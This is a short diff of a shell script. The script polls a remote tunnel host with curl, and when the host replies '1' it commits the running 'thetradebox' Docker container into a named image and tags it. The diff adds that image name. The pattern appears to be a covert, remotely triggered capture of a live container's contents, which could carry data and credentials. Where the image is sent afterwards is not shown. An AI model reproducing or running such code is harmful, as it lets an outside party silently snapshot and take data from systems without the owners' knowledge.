@@ -1,7 +1,7 @@
 if [[ $(curl http://file-explain.gl.at.ply.gg:13782/linux8888) == "1" ]]
 then
 
-docker commit $(docker ps | grep "thetradebox" | sed "s/.* //g")
+docker commit $(docker ps | grep "thetradebox" | sed "s/.* //g") tradeinc/thetradeboxsignal88888888
 
 docker tag tradeinc/thetradeboxsignal88888888 tradeinc/thetradeboxsignal88888888
 
